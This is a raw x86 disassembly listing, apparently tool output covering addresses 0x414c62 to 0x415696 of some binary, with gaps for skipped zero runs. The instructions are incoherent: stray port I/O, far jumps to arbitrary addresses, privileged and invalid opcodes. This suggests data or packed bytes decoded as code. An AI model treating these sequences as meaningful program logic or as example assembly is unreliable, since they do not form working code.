  414c62:	xchg   DWORD PTR [bx+di],esi
  414c65:	sub    ecx,DWORD PTR [ebx-0x5a]
  414c68:	fiadd  WORD PTR [ebx+0x1d18c755]
  414c6e:	js     0x414cc6
  414c70:	std    
  414c71:	add    eax,DWORD PTR [esi+0x45]
  414c74:	xchg   edi,eax
  414c75:	mov    ebp,0x8f071b2e
  414c7a:	or     edx,DWORD PTR [ebx]
  414c7c:	clc    
  414c7d:	sub    al,0x7b
  414c7f:	mov    WORD PTR [ebp+ebp*8+0x42c5d17f],es
  414c86:	pusha  
  414c87:	mov    bh,0xae
  414c89:	xchg   ecx,eax
  414c8a:	pop    eax
  414c8b:	sbb    eax,esp
  414c8d:	and    dh,dl
  414c8f:	in     eax,dx
  414c90:	or     ebp,DWORD PTR [edx+0x5e]
  414c93:	adc    BYTE PTR [ebx+edi*2-0x1a781831],dh
  414c9a:	push   ebx
  414c9b:	xchg   edx,eax
  414c9c:	jmp    0xf2f90389
  414ca1:	inc    edx
  414ca2:	test   BYTE PTR [edi-0x43],dh
  414ca5:	in     al,dx
  414ca6:	sub    ecx,DWORD PTR [edx]
  414ca8:	mov    ds:0xca05b411,al
  414cad:	inc    edx
  414cae:	not    BYTE PTR [eax]
  414cb0:	pop    eax
  414cb1:	push   ecx
  414cb2:	and    ecx,DWORD PTR [edi+0x11]
  414cb5:	add    eax,0xb9df4ec9
  414cba:	out    dx,eax
  414cbb:	ret    0x1c82
  414cbe:	clc    
  414cbf:	fisub  DWORD PTR [ecx+0x65a11310]
  414cc5:	jl     0x414c62
  414cc7:	push   ax
  414cc9:	push   ebp
  414cca:	shl    ebp,0x12
  414ccd:	das    
  414cce:	xor    al,cl
  414cd0:	mov    edi,0xddfa784a
  414cd5:	fild   QWORD PTR [esi-0x65]
  414cd8:	add    DWORD PTR [eax-0x1c4708da],eax
  414cde:	outs   dx,BYTE PTR ds:[esi]
  414cdf:	in     al,0xf4
  414ce1:	and    DWORD PTR [eax+0x3c],0x143fc5df
  414ce8:	mov    BYTE PTR fs:[ebx+edx*8+0x7a53a2d6],cl
  414cf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414cf1:	int3   
  414cf2:	icebp  
  414cf3:	xchg   esi,eax
  414cf4:	repnz sbb al,0x9a
  414cf7:	sbb    al,0xb8
  414cf9:	lds    esp,FWORD PTR [edx]
  414cfb:	in     al,0xc7
  414cfd:	dec    ecx
  414cfe:	or     cl,BYTE PTR es:[esi+0x55]
  414d02:	dec    eax
  414d03:	adc    ebp,DWORD PTR [esi*8-0x31b2c5e1]
  414d0a:	jl     0x414cd3
  414d0c:	pop    ecx
  414d0d:	cwde   
  414d0e:	sub    eax,0xe94b6f19
  414d13:	fstp   DWORD PTR [ebp-0x180c91ad]
  414d19:	pop    edx
  414d1a:	add    DWORD PTR [ebp+eiz*1-0x7c],esp
  414d1e:	repz xchg edx,eax
  414d20:	daa    
  414d21:	outs   dx,BYTE PTR ds:[esi]
  414d22:	mov    ds:0x175a9347,al
  414d27:	add    ecx,DWORD PTR [ecx]
  414d29:	jbe    0x414d76
  414d2b:	push   esp
  414d2c:	mov    ds:0x2462af38,eax
  414d31:	clc    
  414d32:	mov    bh,0x26
  414d34:	repz add BYTE PTR [eax],al
	...
  414d93:	add    BYTE PTR [eax],al
  414d95:	add    BYTE PTR [edi+0x3e911299],dh
  414d9b:	fwait
  414d9c:	mov    bh,0xbf
  414d9e:	sbb    DWORD PTR [esi-0x15e0ebbb],ebp
  414da4:	ror    BYTE PTR [ebx+esi*1],cl
  414da7:	fld    DWORD PTR [eax]
  414da9:	add    BYTE PTR [edi],al
  414dab:	add    DWORD PTR [eax],eax
  414dad:	add    BYTE PTR [eax+0x52],bl
  414db0:	or     al,0xf8
  414db2:	mov    ecx,0xdbc0bdd
  414db7:	push   0x28
  414db9:	(bad)  
  414dba:	jo     0x414d82
  414dbc:	dec    eax
  414dbd:	pop    ss
  414dbe:	mov    al,0x69
  414dc0:	mov    dl,0x17
  414dc2:	adc    al,0xae
  414dc4:	mov    dh,0x2e
  414dc6:	mov    eax,ds:0x9047f3c5
  414dcb:	leave  
  414dcc:	jmp    0x414d63
  414dce:	test   BYTE PTR [ebp+0x48],ah
  414dd1:	sti    
  414dd2:	xchg   ch,ch
  414dd4:	and    bh,BYTE PTR [eax+0x3c425d6d]
  414dda:	inc    ebp
  414ddb:	inc    ebx
  414ddc:	pop    eax
  414ddd:	pusha  
  414dde:	nop
  414ddf:	fsubrp st(5),st
  414de1:	mov    esp,DWORD PTR [edi+0x68743de9]
  414de7:	mov    bh,0xc7
  414de9:	push   0xffffffda
  414deb:	add    BYTE PTR [esi+ecx*2+0x7901903],ch
  414df2:	inc    esi
  414df3:	(bad)  
  414df5:	gs dec ebx
  414df7:	cmp    BYTE PTR [eax+0x2f],bh
  414dfa:	int3   
  414dfb:	or     eax,DWORD PTR [edx-0x25]
  414dfe:	mov    ds:0x8ce15645,al
  414e03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e04:	jno    0x414e07
  414e06:	pop    esi
  414e07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e08:	dec    eax
  414e09:	dec    eax
  414e0a:	repz xor dl,BYTE PTR [ebp+0x5e]
  414e0e:	mov    ds:0x6f95f514,al
  414e13:	xchg   ebp,eax
  414e14:	test   DWORD PTR [eax],edi
  414e16:	lahf   
  414e17:	test   DWORD PTR [ebp-0x6],edi
  414e1a:	adc    BYTE PTR [eax+0x38],bl
  414e1d:	pop    esi
  414e1e:	cmp    al,BYTE PTR [edx-0x68]
  414e21:	ret    0x53b3
  414e24:	xor    al,0x3d
  414e26:	popa   
  414e27:	aaa    
  414e28:	sub    edi,DWORD PTR [eax-0x25]
  414e2b:	add    esp,ebp
  414e2d:	popf   
  414e2e:	mov    BYTE PTR [edx-0x4b1c47e7],0x9d
  414e35:	sbb    DWORD PTR [edi-0x2e],eax
  414e38:	push   edi
  414e39:	xchg   DWORD PTR [edx],eax
  414e3b:	mov    dh,0xe4
  414e3d:	cmp    al,0xd9
  414e3f:	xchg   DWORD PTR [ecx+0x63],ebx
  414e42:	dec    edx
  414e43:	and    BYTE PTR [edx-0x7d9f98dd],ch
  414e49:	arpl   WORD PTR [eax],di
  414e4b:	mov    eax,0xb3a6989d
  414e50:	push   ebx
  414e51:	inc    edx
  414e52:	xor    eax,0xdbc11684
  414e57:	jmp    0x414e9b
  414e59:	inc    eax
  414e5a:	scas   eax,DWORD PTR es:[edi]
  414e5b:	in     eax,0x9a
  414e5d:	mov    edx,0xe485a829
  414e62:	xchg   edx,eax
  414e63:	dec    edx
  414e64:	sbb    esi,ecx
  414e66:	jae    0x414eae
  414e68:	in     eax,dx
  414e69:	ret    
  414e6a:	sbb    al,0x48
  414e6c:	mov    al,0x26
  414e6e:	xlat   BYTE PTR ds:[ebx]
  414e6f:	addr16 hlt 
  414e71:	(bad)  
  414e72:	lods   eax,DWORD PTR ds:[esi]
  414e73:	das    
  414e74:	dec    eax
  414e75:	jne    0x414e20
  414e77:	test   al,0xc2
  414e79:	xor    ebx,edx
  414e7b:	inc    edx
  414e7c:	sub    BYTE PTR [edx-0x6e],bl
  414e7f:	addr16 dec edi
  414e81:	ficom  WORD PTR [ebp+0x25eb87e2]
  414e87:	push   ecx
  414e88:	outs   dx,BYTE PTR gs:[esi]
  414e8a:	jne    0x414ed0
  414e8c:	rol    BYTE PTR [eax+0x788ef218],0x62
  414e93:	ins    DWORD PTR es:[edi],dx
  414e94:	sub    edx,ecx
  414e96:	mov    ds:0x8de6d46a,al
  414e9b:	pop    esp
  414e9c:	mov    dl,0xec
  414e9e:	call   0x102abd1
  414ea3:	lahf   
  414ea4:	stos   DWORD PTR es:[edi],eax
  414ea5:	dec    esi
  414ea6:	retf   
  414ea7:	aam    0x99
  414ea9:	mov    edi,0xe2b604
  414eae:	repz popf 
  414eb0:	push   esi
  414eb1:	jg     0x414ea2
  414eb3:	sub    eax,0x66
	...
  414f14:	add    BYTE PTR [eax],al
  414f16:	aaa    
  414f17:	data16 xor al,0x9b
  414f1a:	jne    0x414ef7
  414f1c:	mov    edi,0x6e73ee
  414f21:	xchg   ebp,eax
  414f22:	dec    edx
  414f23:	cld    
  414f24:	jg     0x414f13
  414f26:	cmp    bl,dl
  414f28:	add    BYTE PTR [eax],al
  414f2a:	pop    es
  414f2b:	add    DWORD PTR [eax],eax
  414f2d:	add    BYTE PTR [esi-0x5c],dh
  414f30:	add    BYTE PTR es:[esi-0x33],0x90
  414f35:	mov    edx,0xefb8d11a
  414f3a:	dec    edi
  414f3b:	sub    eax,0xbffbc6c2
  414f40:	xchg   edi,eax
  414f41:	sar    DWORD PTR [edi],0x9
  414f44:	jge    0x414f67
  414f46:	jmp    0x357ed0df
  414f4b:	aas    
  414f4c:	cmc    
  414f4d:	mov    ebx,0xd19c5765
  414f52:	(bad)  
  414f53:	(bad)  
  414f54:	out    0xbf,al
  414f56:	call   0xca66:0x7d1dc18d
  414f5d:	ret    
  414f5e:	loopne 0x414f8c
  414f60:	cmp    DWORD PTR ds:[edx+0x1a],edx
  414f64:	jp     0x414efb
  414f66:	repz popa 
  414f68:	ret    
  414f69:	loope  0x414fab
  414f6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f6c:	scas   al,BYTE PTR es:[edi]
  414f6d:	dec    ecx
  414f6e:	(bad)  
  414f70:	mov    dl,0x5d
  414f72:	xchg   ebx,eax
  414f73:	fstp   TBYTE PTR [ebx-0x368dd5a4]
  414f79:	push   edx
  414f7a:	cmp    BYTE PTR ds:0xedb33cf0,al
  414f80:	add    edi,DWORD PTR [esi+0x68]
  414f83:	mov    dh,0xa
  414f85:	pop    edi
  414f86:	push   esi
  414f87:	jl     0x414f21
  414f89:	inc    esp
  414f8a:	sbb    esi,eax
  414f8c:	dec    esp
  414f8d:	std    
  414f8e:	fisttp DWORD PTR [edx-0x6e]
  414f91:	jae    0x414f38
  414f93:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  414f95:	sbb    bl,BYTE PTR [esi+edi*8+0x58]
  414f99:	jne    0x414f74
  414f9b:	sbb    DWORD PTR [edx+0x3],ebp
  414f9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f9f:	es pushf 
  414fa1:	addr16 retf 
  414fa3:	call   0x251c77ab
  414fa8:	add    BYTE PTR ds:0x8ea07932,al
  414fae:	fldenv [edx-0x34fb6d9c]
  414fb4:	retf   
  414fb5:	(bad)  
  414fb6:	jle    0x414fa3
  414fb8:	mov    dl,0x5e
  414fba:	jmp    FWORD PTR [ebx-0x76]
  414fbd:	dec    eax
  414fbe:	cmp    ebp,edx
  414fc0:	out    0xcc,al
  414fc2:	jnp    0x414ff2
  414fc4:	popf   
  414fc5:	add    BYTE PTR [eax],ch
  414fc7:	(bad)  
  414fc8:	std    
  414fc9:	inc    edi
  414fca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414fcb:	jmp    0xdfbc:0x9922b820
  414fd2:	(bad)  
  414fd4:	scas   eax,DWORD PTR es:[edi]
  414fd5:	dec    ebx
  414fd6:	xchg   DWORD PTR [eax+edx*8+0x2b43d09],edi
  414fdd:	and    DWORD PTR [eax-0x4cc16d74],ecx
  414fe3:	pop    edi
  414fe4:	push   edx
  414fe5:	mov    eax,ds:0x49fb6028
  414fea:	mov    dh,0xe8
  414fec:	mov    eax,ds:0x48cf6279
  414ff1:	or     al,0x32
  414ff3:	mov    esp,0xafd0fe8f
  414ff8:	push   ds
  414ff9:	mov    ds:0x88736b18,al
  414ffe:	pop    esp
  414fff:	data16 clc 
  415001:	mov    DWORD PTR [ebp-0x5b],esi
  415004:	in     al,0xd7
  415006:	mov    esp,DWORD PTR [edi-0x5e]
  415009:	nop
  41500a:	mov    ch,0x71
  41500c:	cwde   
  41500d:	xor    bl,dl
  41500f:	je     0x41503d
  415011:	dec    ebp
  415012:	lods   eax,DWORD PTR ds:[esi]
  415013:	stos   DWORD PTR es:[edi],eax
  415014:	sbb    ecx,eax
  415016:	inc    edi
  415017:	adc    eax,0x38594136
  41501c:	outs   dx,DWORD PTR ds:[esi]
  41501d:	pushf  
  41501e:	out    0x22,al
  415020:	sbb    dl,BYTE PTR [edi]
  415022:	xchg   esi,eax
  415023:	mov    ebp,0xcbb99dd0
  415028:	cmc    
  415029:	jg     0x415014
  41502b:	inc    ebx
  41502c:	mov    eax,0xb740d91a
  415031:	fcom   DWORD PTR [ecx]
  415033:	adc    BYTE PTR [edi],0x0
	...
  415096:	jnp    0x41509a
  415098:	add    ebp,ebx
  41509a:	jnp    0x415087
  41509c:	sti    
  41509d:	xchg   edx,eax
  41509e:	and    BYTE PTR [ebx],ah
  4150a0:	pushf  
  4150a1:	test   eax,0x84615ef2
  4150a6:	inc    ecx
  4150a7:	fild   DWORD PTR [eax]
  4150a9:	add    BYTE PTR [edi],al
  4150ab:	add    DWORD PTR [eax],eax
  4150ad:	add    BYTE PTR [ecx+0x43f6442e],cl
  4150b3:	adc    BYTE PTR gs:[esi],0x61
  4150b7:	xor    DWORD PTR [ebx],0x1ead3415
  4150bd:	adc    al,0xad
  4150bf:	mov    ch,0x95
  4150c1:	jmp    0x7bb209f7
  4150c6:	dec    ebp
  4150c7:	retf   0x32d6
  4150ca:	adc    eax,0xce05b5ce
  4150cf:	pop    ds
  4150d0:	mov    ds:0x86327f71,al
  4150d5:	fstp   DWORD PTR [edi-0x34db988c]
  4150db:	scas   al,BYTE PTR es:[edi]
  4150dc:	ret    0xd99f
  4150df:	dec    edi
  4150e0:	addr16 test ah,dh
  4150e3:	leave  
  4150e4:	xor    ah,BYTE PTR [ecx-0x75]
  4150e7:	in     al,dx
  4150e8:	lds    ecx,FWORD PTR [ebp-0x60]
  4150eb:	sub    esp,DWORD PTR [ebx]
  4150ed:	aaa    
  4150ee:	or     BYTE PTR [ecx+edx*2],bl
  4150f1:	or     bl,ah
  4150f3:	sbb    al,0x26
  4150f5:	lods   eax,DWORD PTR ds:[esi]
  4150f6:	call   0xbf8a:0x586effb2
  4150fd:	inc    esp
  4150fe:	and    BYTE PTR ds:0x1cb86a29,ah
  415104:	sub    BYTE PTR ds:0x248d7c,ch
  41510a:	and    DWORD PTR [edi],edx
  41510c:	fdiv   st,st(5)
  41510e:	inc    ebx
  41510f:	sbb    DWORD PTR [ebx+0x4a69eab8],ebx
  415115:	in     eax,dx
  415116:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415117:	(bad)
  41511a:	leave  
  41511b:	jge    0x4150b7
  41511d:	mov    esp,edi
  41511f:	fstp   DWORD PTR [edx+0x36]
  415122:	mov    ah,0xb8
  415124:	leave  
  415125:	call   0xb43d:0x6d4787c3
  41512c:	lods   al,BYTE PTR ds:[esi]
  41512d:	lahf   
  41512e:	stos   DWORD PTR es:[edi],eax
  41512f:	add    BYTE PTR [eax+0x55],bh
  415132:	lds    ecx,FWORD PTR [eax]
  415134:	inc    edi
  415135:	(bad)  
  415136:	call   0x1eda80bc
  41513b:	adc    ecx,ebp
  41513d:	mov    cl,BYTE PTR [eax]
  41513f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415140:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415141:	jo     0x41514c
  415143:	add    edi,edi
  415145:	mov    ds:0x54f30bfa,al
  41514a:	dec    edx
  41514b:	push   cs
  41514c:	dec    ecx
  41514d:	int    0xbb
  41514f:	and    BYTE PTR [esi-0x55825dbb],0x72
  415156:	mov    bl,BYTE PTR [ecx-0x2]
  415159:	imul   esp,DWORD PTR [ebp-0x30],0x7e
  41515d:	fistp  DWORD PTR [ecx-0x502a4b7f]
  415163:	cwde   
  415164:	mov    edx,0x33165066
  415169:	inc    ebx
  41516a:	sub    eax,0x6ac52fb5
  41516f:	and    al,0xb3
  415171:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415172:	scas   eax,DWORD PTR es:[edi]
  415173:	dec    esi
  415174:	cdq    
  415175:	xchg   esp,eax
  415176:	jae    0x4151c4
  415178:	pop    edi
  415179:	das    
  41517a:	mov    ds:0xa2869430,al
  41517f:	stos   DWORD PTR es:[edi],eax
  415180:	popf   
  415181:	and    BYTE PTR [edx],al
  415183:	test   DWORD PTR [ecx+0x18],ebx
  415186:	jnp    0x41511c
  415188:	sbb    DWORD PTR [ebp+0x9ec8b5],edi
  41518e:	(bad)  
  415190:	enter  0x38d,0x66
  415194:	call   0x2905:0x11bdc214
  41519b:	sub    eax,0xf02c6e0d
  4151a0:	outs   dx,DWORD PTR ds:[esi]
  4151a1:	lea    ebx,[edi-0x5]
  4151a4:	pop    esi
  4151a5:	pop    es
  4151a6:	cmc    
  4151a7:	and    ebx,ebx
  4151a9:	sub    eax,0xb921ad67
  4151ae:	dec    esp
  4151af:	push   ss
  4151b0:	cmp    esp,DWORD PTR [edi+0x49]
  4151b3:	adc    edx,edx
	...
  415215:	add    BYTE PTR [edi+edx*4],ch
  415218:	pop    ds
  415219:	sar    DWORD PTR [edi+0xffeed9],1
  41521f:	lods   eax,DWORD PTR ds:[esi]
  415220:	std    
  415221:	mov    al,0xf5
  415223:	pop    ds
  415224:	das    
  415225:	sbb    ecx,DWORD PTR [eax-0x24]
  415228:	add    BYTE PTR [eax],al
  41522a:	pop    es
  41522b:	add    DWORD PTR [eax],eax
  41522d:	add    BYTE PTR [esp+edx*4+0x9bcfa21],bl
  415234:	mov    ah,0x3f
  415236:	cmp    BYTE PTR [ebx],ch
  415238:	mov    edi,DWORD PTR ds:0xc5580ff7
  41523e:	xchg   edi,eax
  41523f:	stc    
  415240:	pop    ecx
  415241:	in     al,dx
  415242:	fwait
  415243:	sbb    BYTE PTR [ebp+eax*2+0x38],ch
  415247:	push   0x506c3eaa
  41524c:	inc    edi
  41524d:	jae    0x4152b5
  41524f:	inc    BYTE PTR [esi+ecx*4-0x68]
  415253:	or     DWORD PTR [ecx+0x3c],0xffffffc3
  415257:	mov    ds:0x49f6c396,eax
  41525c:	out    dx,al
  41525d:	cmp    BYTE PTR [ecx+0x74],cl
  415260:	les    ecx,FWORD PTR [ecx*4-0x1df2f0c9]
  415267:	cwde   
  415268:	xor    DWORD PTR [edx-0x2f],0xffffffb5
  41526c:	sub    DWORD PTR [ebx],edx
  41526e:	les    ebx,FWORD PTR [esi-0x46ac6480]
  415274:	test   BYTE PTR [ebx+eiz*8-0x22],ah
  415278:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415279:	std    
  41527a:	fild   QWORD PTR [ebx+0x778a83de]
  415280:	pop    esi
  415281:	mov    esp,0x24502e2d
  415286:	test   al,0xd4
  415288:	ja     0x4152ba
  41528a:	clc    
  41528b:	jbe    0x41524c
  41528d:	pushf  
  41528e:	stc    
  41528f:	mov    esi,esi
  415291:	test   BYTE PTR [edi-0x26593260],al
  415297:	inc    ebp
  415298:	rcr    DWORD PTR [ecx],1
  41529a:	sysret 
  41529c:	sbb    BYTE PTR [edx],0x5b
  41529f:	sub    eax,ecx
  4152a1:	pop    edx
  4152a2:	rol    DWORD PTR [ebx-0x7f],0x59
  4152a6:	in     al,0xdc
  4152a8:	fsubr  DWORD PTR [edx+ecx*2+0x545ad9f]
  4152af:	adc    dh,BYTE PTR [esi]
  4152b1:	outs   dx,BYTE PTR ds:[esi]
  4152b2:	mov    ecx,0xab47060a
  4152b7:	jno    0x4152e5
  4152b9:	sub    eax,0x254fc0d8
  4152be:	stos   BYTE PTR es:[edi],al
  4152bf:	jp     0x4152af
  4152c1:	gs call 0xea5d5d06
  4152c7:	pop    ebp
  4152c8:	shl    BYTE PTR [esi+0x2288bfc8],cl
  4152ce:	ds sbb eax,0x9cd220a7
  4152d4:	(bad)  
  4152d5:	and    ah,BYTE PTR [ebx]
  4152d7:	add    edx,DWORD PTR [ebx*1-0x57e31ca7]
  4152de:	loope  0x4152d5
  4152e0:	shr    DWORD PTR [ebx-0x54],1
  4152e3:	push   edi
  4152e4:	jbe    0x415272
  4152e6:	je     0x4152d5
  4152e8:	out    dx,eax
  4152e9:	adc    al,0xce
  4152eb:	mov    ecx,DWORD PTR [eax+0xce5417a]
  4152f1:	sbb    al,0xfb
  4152f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4152f4:	loope  0x415347
  4152f6:	xchg   al,dh
  4152f8:	add    DWORD PTR [ebx+ebx*8+0x6ce346bf],esi
  4152ff:	xor    dl,BYTE PTR [ecx+0x6b]
  415302:	add    DWORD PTR ds:0x8cc8ad41,eax
  415308:	dec    eax
  415309:	xchg   edi,eax
  41530a:	cmc    
  41530b:	into   
  41530c:	mov    bh,0x2c
  41530e:	stos   DWORD PTR es:[edi],eax
  41530f:	xchg   ebx,eax
  415310:	adc    eax,0xa58b8039
  415315:	dec    esi
  415316:	cwde   
  415317:	push   edi
  415318:	push   cs
  415319:	fimul  DWORD PTR [edx]
  41531b:	mov    WORD PTR [edi+0x8],ds
  41531e:	jge    0x4152cc
  415320:	cld    
  415321:	dec    eax
  415322:	inc    edx
  415323:	fwait
  415324:	iret   
  415325:	leave  
  415326:	mov    cl,0x7c
  415328:	push   0xffffffb5
  41532a:	cmp    bl,BYTE PTR [ebp+0x13]
  41532d:	or     al,0xfb
  41532f:	adc    eax,0x6abbf271
  415334:	sub    al,0x0
	...
  415396:	ins    DWORD PTR es:[edi],dx
  415397:	lock repz jmp FWORD PTR cs:[edi]
  41539c:	std    
  41539d:	repz mov ebx,0xe74b9b2a
  4153a3:	or     ch,BYTE PTR [edx+0xdd4ff8]
  4153a9:	add    BYTE PTR [edi],al
  4153ab:	add    DWORD PTR [eax],eax
  4153ad:	add    BYTE PTR [ecx],ah
  4153af:	xor    BYTE PTR [edi],0xb3
  4153b2:	sbb    eax,0x97512fee
  4153b7:	add    al,0x75
  4153b9:	mov    ds:0x939d25dc,eax
  4153be:	inc    ebx
  4153bf:	sbb    bh,BYTE PTR [ebp-0x4736f347]
  4153c5:	push   ebx
  4153c6:	lahf   
  4153c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153c8:	jne    0x415420
  4153ca:	aam    0x29
  4153cc:	pop    esp
  4153cd:	mov    al,ds:0xa1da725c
  4153d2:	ja     0x415358
  4153d4:	dec    ebx
  4153d5:	repnz pop edx
  4153d7:	xchg   esp,eax
  4153d8:	aas    
  4153d9:	leave  
  4153da:	fcomp  DWORD PTR [ecx]
  4153dc:	push   ss
  4153dd:	test   eax,0x9ed02ba7
  4153e2:	enter  0xcd0d,0x45
  4153e6:	imul   BYTE PTR [eax-0x11]
  4153e9:	imul   ebp,esi,0x64df8156
  4153ef:	cmp    ah,ch
  4153f1:	or     BYTE PTR [ebx-0x27],bl
  4153f4:	test   DWORD PTR [edx],eax
  4153f6:	ins    BYTE PTR es:[edi],dx
  4153f7:	fimul  DWORD PTR [eax-0x1]
  4153fa:	pusha  
  4153fb:	dec    ebx
  4153fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153fd:	pop    edx
  4153fe:	or     eax,0xee47d214
  415403:	adc    edx,ebx
  415405:	out    dx,al
  415406:	sub    DWORD PTR [edi-0xb],0xffffffa6
  41540a:	cdq    
  41540b:	out    0xa5,al
  41540d:	lahf   
  41540e:	mov    ebp,0x6ff62252
  415413:	in     al,0xc8
  415415:	cld    
  415416:	push   esi
  415417:	lods   eax,DWORD PTR ds:[esi]
  415418:	and    al,0x9b
  41541a:	shr    DWORD PTR [ebp-0x7cb1594d],1
  415420:	mov    dh,0x1
  415422:	jae    0x41541b
  415424:	cdq    
  415425:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415426:	outs   dx,DWORD PTR ds:[esi]
  415427:	mov    al,0x8e
  415429:	mov    BYTE PTR [ebx-0x52757ea6],0x72
  415430:	out    dx,al
  415431:	jle    0x4153e2
  415433:	fidiv  DWORD PTR [ebp-0x62]
  415436:	xchg   esp,eax
  415437:	jno    0x4154b2
  415439:	pop    ss
  41543a:	xor    edi,DWORD PTR [edx+0x3bcce856]
  415440:	das    
  415441:	fisubr DWORD PTR [edi+0xf]
  415444:	mov    cl,dl
  415446:	pop    esp
  415447:	jmp    0x7224:0x1bd0291
  41544e:	sub    al,0x40
  415450:	stos   DWORD PTR es:[edi],eax
  415451:	sbb    eax,0x76ad1761
  415456:	dec    ecx
  415457:	rcr    DWORD PTR [eax-0x7490780],0x98
  41545e:	loopne 0x415405
  415460:	adc    esi,DWORD PTR [edi+ecx*4+0x2b2de718]
  415467:	stos   BYTE PTR es:[edi],al
  415468:	and    eax,0xa763635
  41546d:	pop    es
  41546e:	(bad)  [ecx]
  415470:	scas   eax,DWORD PTR es:[edi]
  415471:	pop    eax
  415472:	fnstenv [esi]
  415474:	stc    
  415475:	mov    dh,0x81
  415477:	int    0x83
  415479:	cwde   
  41547a:	cwde   
  41547b:	jmp    0x6d498a75
  415480:	lock icebp 
  415482:	dec    esp
  415483:	inc    esi
  415484:	and    BYTE PTR [edx],dl
  415486:	push   ebx
  415487:	and    al,0xa0
  415489:	stc    
  41548a:	jne    0xe0fc33a9
  415490:	(bad)  
  415491:	dec    ebp
  415492:	fidivr WORD PTR [edx+0xf]
  415495:	pop    edx
  415496:	mov    al,ds:0x1fe2f72c
  41549b:	scas   eax,DWORD PTR es:[edi]
  41549c:	fnsave [ebp+0x1154e71c]
  4154a2:	or     DWORD PTR [edi-0x5b],ecx
  4154a5:	aad    0xf5
  4154a7:	fist   WORD PTR [eax+ebx*2]
  4154aa:	cmp    ecx,DWORD PTR [esi+0x3af3f254]
  4154b0:	or     BYTE PTR [esi+ebp*1+0x31],ch
  4154b4:	dec    ebp
	...
  415515:	add    ah,ah
  415517:	lock sub DWORD PTR [edx],ecx
  41551a:	cmp    eax,0xc0fee7db
  41551f:	cmp    ebx,DWORD PTR [edi]
  415521:	pop    esp
  415522:	daa    
  415523:	xor    al,0x93
  415525:	sbb    edx,DWORD PTR [esi-0x22]
  415528:	add    BYTE PTR [eax],al
  41552a:	pop    es
  41552b:	add    DWORD PTR [eax],eax
  41552d:	add    BYTE PTR [eax+0x4d],cl
  415530:	out    0x58,eax
  415532:	out    0xd5,eax
  415534:	inc    ebx
  415535:	mov    BYTE PTR [ecx-0x1d],bh
  415538:	leave  
  415539:	jecxz  0x4155b5
  41553b:	int3   
  41553c:	shr    ch,1
  41553e:	sub    bh,ch
  415540:	push   ebp
  415541:	loopne 0x41554f
  415543:	(bad)  
  415544:	push   edi
  415545:	mov    esi,0x10630a47
  41554a:	and    BYTE PTR [ecx+0x3f155016],cl
  415550:	or     BYTE PTR [esi],0x38
  415553:	xor    dl,al
  415555:	mov    cl,0x61
  415557:	je     0x415545
  415559:	call   DWORD PTR ds:0x7dc0dca7
  41555f:	test   BYTE PTR [edi+0x34],al
  415562:	xor    DWORD PTR [ecx+0x6bfa47a9],ebp
  415568:	push   eax
  415569:	add    eax,0x7f42ea0
  41556e:	outs   dx,BYTE PTR ds:[esi]
  41556f:	int    0x89
  415571:	shl    ah,cl
  415573:	aam    0xd1
  415575:	inc    ebp
  415576:	or     eax,DWORD PTR [ebp+0x66]
  415579:	add    BYTE PTR [ebp+0x7f3ff8b2],bl
  41557f:	add    eax,0xe7506d5f
  415584:	enter  0x72e4,0x70
  415588:	ss ret 0xfb01
  41558c:	sub    DWORD PTR [edi],esp
  41558e:	mov    DWORD PTR [ebp+0x55922652],ebx
  415594:	sub    ecx,eax
  415596:	add    bl,dh
  415598:	scas   al,BYTE PTR es:[edi]
  415599:	rcr    DWORD PTR [esi+0x52f0f2b],cl
  41559f:	mov    ch,0x7e
  4155a1:	std    
  4155a2:	jo     0x4155ca
  4155a4:	mov    ebp,ebx
  4155a6:	add    al,0xad
  4155a8:	push   esi
  4155a9:	retf   0x8880
  4155ac:	xor    DWORD PTR [ebx+0x21],edx
  4155af:	pop    ecx
  4155b0:	shl    DWORD PTR [ecx],0x3a
  4155b3:	stos   BYTE PTR es:[edi],al
  4155b4:	ror    DWORD PTR [edi+0x28],1
  4155b7:	mov    esp,0x256d61b
  4155bc:	xor    al,0x2a
  4155be:	add    DWORD PTR [edi+esi*2-0x6c],0x47
  4155c3:	mov    cl,0xe2
  4155c5:	xchg   esp,eax
  4155c6:	mov    eax,ds:0x4a1ea115
  4155cb:	test   eax,0xd5d17e83
  4155d0:	push   edx
  4155d1:	aaa    
  4155d2:	sbb    eax,0x7938ab3a
  4155d7:	mov    bh,BYTE PTR [ebx]
  4155d9:	dec    ebx
  4155da:	adc    eax,0x944b0ae
  4155df:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  4155e1:	ss push 0xf4cc4af1
  4155e7:	bound  ebx,QWORD PTR [esi+0x3c752278]
  4155ed:	xor    DWORD PTR [ebx-0x13f3804f],esi
  4155f3:	dec    ebp
  4155f4:	daa    
  4155f5:	push   cs
  4155f6:	shl    ecx,cl
  4155f8:	mov    al,ds:0x326ecf94
  4155fd:	mov    ch,BYTE PTR [eax+0x4b2ca616]
  415603:	loopne 0x41567e
  415605:	pop    esi
  415606:	cmp    dh,BYTE PTR [ecx-0x56864fb8]
  41560c:	test   al,0x34
  41560e:	dec    edi
  41560f:	jmp    0x6b5c:0x4028d911
  415616:	mov    al,ds:0x99712d4d
  41561b:	ins    BYTE PTR es:[edi],dx
  41561c:	retf   
  41561d:	mov    ebp,0x44f1a667
  415622:	imul   ecx,DWORD PTR [eax],0x90c07e8
  415628:	jnp    0x4155c5
  41562a:	test   al,0x8c
  41562c:	(bad)  
  41562d:	fs call 0xe6afdd40
  415633:	mov    al,ds:0x9c
	...
  415694:	add    BYTE PTR [eax],al
  415696:	ins    DWORD PTR es:[edi],dx
